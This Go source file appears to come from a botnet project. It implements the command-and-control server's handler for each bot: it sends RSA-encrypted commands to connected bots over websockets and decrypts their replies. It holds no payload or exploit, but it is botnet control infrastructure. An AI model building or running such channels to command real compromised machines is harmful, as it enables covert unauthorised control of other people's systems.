package ccworker

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"

	uuid "github.com/satori/go.uuid"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 1024                // Maximum message size allowed from peer
)

// BotWorker holds the information the command and control server needs
// from a connected bot
type BotWorker struct {
	ID            string
	cmdEncryptKey *rsa.PublicKey
	msgDecryptKey *rsa.PrivateKey
	WSConn        *websocket.Conn
	CommandChan   chan *protocol.Command
	MessageChan   chan *protocol.Message
}

// NewBotWorker is the constructor for a bot worker abstraction
func NewBotWorker(msgDecryptKey *rsa.PrivateKey, cmdEncryptKey string, conn *websocket.Conn, msgChan chan *protocol.Message) (*BotWorker, error) {
	pubKey, err := encryption.DecodePubKeyPEM([]byte(cmdEncryptKey))
	if err != nil {
		return nil, fmt.Errorf("could not decode pub key: %s", err)
	}
	return &BotWorker{
		ID:            uuid.NewV4().String(),
		cmdEncryptKey: pubKey,
		msgDecryptKey: msgDecryptKey,
		WSConn:        conn,
		CommandChan:   make(chan *protocol.Command),
		MessageChan:   msgChan,
	}, nil
}

func (b *BotWorker) Start() {
	go b.writer()
	go b.reader()
}

func (b *BotWorker) reader() {
	b.WSConn.SetReadLimit(maxMessageSize)
	b.WSConn.SetReadDeadline(time.Now().Add(pongWait))
	b.WSConn.SetPongHandler(func(string) error { b.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		// get the next message
		msgType, encryptedMessage, err := b.WSConn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary type (non encrypted) messages
		if msgType != 2 {
			continue
		}
		// decrypt the JSON event and unmarshal onto the event type
		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, b.msgDecryptKey)
		if err != nil {
			log.Printf("could not decrypt message from bot %s: %s", b.ID, err)
			continue
		}
		var msg protocol.Message
		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
			log.Printf("could not unmarshal message from bot %s: %s", b.ID, err)
			continue
		}
		msg.BotID = b.ID // attach bot ID to message
		b.MessageChan <- &msg
	}
}

func (b *BotWorker) writer() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		b.WSConn.Close()
	}()
	for {
		select {
		case cmd, ok := <-b.CommandChan:
			b.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				log.Println("we shouldnt get here though")
				b.WSConn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			cmdJSONBytes, err := json.Marshal(cmd)
			if err != nil {
				return
			}
			encryptedCmd, err := encryption.EncryptMessage(cmdJSONBytes, b.cmdEncryptKey)
			if err != nil {
				return
			}
			b.WSConn.WriteMessage(websocket.BinaryMessage, encryptedCmd)
		case <-ticker.C:
			b.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := b.WSConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
